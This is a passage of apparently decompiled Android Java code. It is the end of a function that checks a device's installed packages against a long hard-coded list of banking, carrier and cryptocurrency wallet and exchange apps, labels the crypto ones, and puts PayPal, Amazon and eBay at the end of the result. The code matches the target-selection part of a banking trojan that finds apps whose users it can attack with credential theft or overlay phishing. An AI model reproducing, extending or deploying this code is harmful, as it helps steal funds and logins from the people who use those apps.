            if (applicationInfo.packageName.equals("finansbank.enpara")) {
                str = str + "finansbank.enpara,";
            }
            if (applicationInfo.packageName.equals("tr.com.hsbc.hsbcturkey")) {
                str = str + "tr.com.hsbc.hsbcturkey,";
            }
            if (applicationInfo.packageName.equals("tr.com.sekerbilisim.mbank")) {
                str = str + "tr.com.sekerbilisim.mbank,";
            }
            if (applicationInfo.packageName.equals("com.att.myWireless")) {
                str = str + "com.att.myWireless,";
            }
            if (applicationInfo.packageName.equals("com.vzw.hss.myverizon")) {
                str = str + "com.vzw.hss.myverizon,";
            }
            if (applicationInfo.packageName.equals("aib.ibank.android")) {
                str = str + "aib.ibank.android,";
            }
            if (applicationInfo.packageName.equals("com.bbnt")) {
                str = str + "com.bbnt,";
            }
            if (applicationInfo.packageName.equals("com.csg.cs.dnmbs")) {
                str = str + "com.csg.cs.dnmbs,";
            }
            if (applicationInfo.packageName.equals("com.discoverfinancial.mobile")) {
                str = str + "com.discoverfinancial.mobile,";
            }
            if (applicationInfo.packageName.equals("com.eastwest.mobile")) {
                str = str + "com.eastwest.mobile,";
            }
            if (applicationInfo.packageName.equals("com.fi6256.godough")) {
                str = str + "com.fi6256.godough,";
            }
            if (applicationInfo.packageName.equals("com.fi6543.godough")) {
                str = str + "com.fi6543.godough,";
            }
            if (applicationInfo.packageName.equals("com.fi6665.godough")) {
                str = str + "com.fi6665.godough,";
            }
            if (applicationInfo.packageName.equals("com.fi9228.godough")) {
                str = str + "com.fi9228.godough,";
            }
            if (applicationInfo.packageName.equals("com.fi9908.godough")) {
                str = str + "com.fi9908.godough,";
            }
            if (applicationInfo.packageName.equals("com.ifs.banking.fiid1369")) {
                str = str + "com.ifs.banking.fiid1369,";
            }
            if (applicationInfo.packageName.equals("com.ifs.mobilebanking.fiid3919")) {
                str = str + "com.ifs.mobilebanking.fiid3919,";
            }
            if (applicationInfo.packageName.equals("com.jackhenry.rockvillebankct")) {
                str = str + "com.jackhenry.rockvillebankct,";
            }
            if (applicationInfo.packageName.equals("com.jackhenry.washingtontrustbankwa")) {
                str = str + "com.jackhenry.washingtontrustbankwa,";
            }
            if (applicationInfo.packageName.equals("com.jpm.sig.android")) {
                str = str + "com.jpm.sig.android,";
            }
            if (applicationInfo.packageName.equals("com.sterling.onepay")) {
                str = str + "com.sterling.onepay,";
            }
            if (applicationInfo.packageName.equals("com.svb.mobilebanking")) {
                str = str + "com.svb.mobilebanking,";
            }
            if (applicationInfo.packageName.equals("org.usemployees.mobile")) {
                str = str + "org.usemployees.mobile,";
            }
            if (applicationInfo.packageName.equals("pinacleMobileiPhoneApp.android")) {
                str = str + "pinacleMobileiPhoneApp.android,";
            }
            if (applicationInfo.packageName.equals("com.fuib.android.spot.online")) {
                str = str + "com.fuib.android.spot.online,";
            }
            if (applicationInfo.packageName.equals("com.ukrsibbank.client.android")) {
                str = str + "com.ukrsibbank.client.android,";
            }
            if (applicationInfo.packageName.equals("ru.alfabank.mobile.ua.android")) {
                str = str + "ru.alfabank.mobile.ua.android,";
            }
            if (applicationInfo.packageName.equals("ua.aval.dbo.client.android")) {
                str = str + "ua.aval.dbo.client.android,";
            }
            if (applicationInfo.packageName.equals("ua.com.cs.ifobs.mobile.android.otp")) {
                str = str + "ua.com.cs.ifobs.mobile.android.otp,";
            }
            if (applicationInfo.packageName.equals("ua.com.cs.ifobs.mobile.android.pivd")) {
                str = str + "ua.com.cs.ifobs.mobile.android.pivd,";
            }
            if (applicationInfo.packageName.equals("ua.oschadbank.online")) {
                str = str + "ua.oschadbank.online,";
            }
            if (applicationInfo.packageName.equals("ua.privatbank.ap24")) {
                str = str + "ua.privatbank.ap24,";
            }
            if (applicationInfo.packageName.equals("com.Plus500")) {
                str = str + "com.Plus500(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("eu.unicreditgroup.hvbapptan")) {
                str = str + "eu.unicreditgroup.hvbapptan,";
            }
            if (applicationInfo.packageName.equals("com.targo_prod.bad")) {
                str = str + "com.targo_prod.bad,";
            }
            if (applicationInfo.packageName.equals("com.db.pwcc.dbmobile")) {
                str = str + "com.db.pwcc.dbmobile,";
            }
            if (applicationInfo.packageName.equals("com.db.mm.norisbank")) {
                str = str + "com.db.mm.norisbank,";
            }
            if (applicationInfo.packageName.equals("com.bitmarket.trader")) {
                str = str + "com.bitmarket.trader(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.plunien.poloniex")) {
                str = str + "com.plunien.poloniex(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.bitmarket.trader")) {
                str = str + "com.bitmarket.trader(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.mycelium.wallet")) {
                str = str + "com.mycelium.wallet(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.bitfinex.bfxapp")) {
                str = str + "com.bitfinex.bfxapp(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.binance.dev")) {
                str = str + "com.binance.dev(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.btcturk")) {
                str = str + "com.btcturk(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.binance.odapplications")) {
                str = str + "com.binance.odapplications(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.blockfolio.blockfolio")) {
                str = str + "com.blockfolio.blockfolio(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.crypter.cryptocyrrency")) {
                str = str + "com.crypter.cryptocyrrency(Crypt),";
            }
            if (applicationInfo.packageName.equals("io.getdelta.android")) {
                str = str + "io.getdelta.android(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.edsoftapps.mycoinsvalue")) {
                str = str + "com.edsoftapps.mycoinsvalue(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.coin.profit")) {
                str = str + "com.coin.profit(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.mal.saul.coinmarketcap")) {
                str = str + "com.mal.saul.coinmarketcap(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.tnx.apps.coinportfolio")) {
                str = str + "com.tnx.apps.coinportfolio(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.coinbase.android")) {
                str = str + "com.coinbase.android(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.portfolio.coinbase_tracker")) {
                str = str + "com.portfolio.coinbase_tracker(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("de.schildbach.wallet")) {
                str = str + "de.schildbach.wallet(Crypt),";
            }
            if (applicationInfo.packageName.equals("piuk.blockchain.android")) {
                str = str + "piuk.blockchain.android(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("info.blockchain.merchant")) {
                str = str + "info.blockchain.merchant(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.jackpf.blockchainsearch")) {
                str = str + "com.jackpf.blockchainsearch(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.unocoin.unocoinwallet")) {
                str = str + "com.unocoin.unocoinwallet(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.unocoin.unocoinmerchantPoS")) {
                str = str + "com.unocoin.unocoinmerchantPoS(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.thunkable.android.santoshmehta364.UNOCOIN_LIVE")) {
                str = str + "com.thunkable.android.santoshmehta364.UNOCOIN_LIVE(Crypt),";
            }
            if (applicationInfo.packageName.equals("wos.com.zebpay")) {
                str = str + "wos.com.zebpay(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.localbitcoinsmbapp")) {
                str = str + "com.localbitcoinsmbapp(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.thunkable.android.manirana54.LocalBitCoins")) {
                str = str + "com.thunkable.android.manirana54.LocalBitCoins(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.thunkable.android.manirana54.LocalBitCoins_unblock")) {
                str = str + "com.thunkable.android.manirana54.LocalBitCoins_unblock(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.localbitcoins.exchange")) {
                str = str + "com.localbitcoins.exchange(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.coins.bit.local")) {
                str = str + "com.coins.bit.local(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.coins.ful.bit")) {
                str = str + "com.coins.ful.bit(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.jamalabbasii1998.localbitcoin")) {
                str = str + "com.jamalabbasii1998.localbitcoin(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("zebpay.Application")) {
                str = str + " zebpay.Application(Crypt)+,";
            }
            if (applicationInfo.packageName.equals("com.bitcoin.ss.zebpayindia")) {
                str = str + "com.bitcoin.ss.zebpayindia(Crypt),";
            }
            if (applicationInfo.packageName.equals("com.kryptokit.jaxx")) {
                str = str + "com.kryptokit.jaxx(Crypt),";
            }
        }
        if (str.contains("com.paypal.android.p2pmobile,")) {
            str = str.replace("com.paypal.android.p2pmobile,", "") + "com.paypal.android.p2pmobile,";
        }
        if (str.contains("com.amazon.mShop.android.shopping,")) {
            str = str.replace("com.amazon.mShop.android.shopping,", "") + "com.amazon.mShop.android.shopping,";
        }
        if (!str.contains("com.ebay.mobile,")) {
            return str;
        }
        return str.replace("com.ebay.mobile,", "") + "com.ebay.mobile,";
    }
}
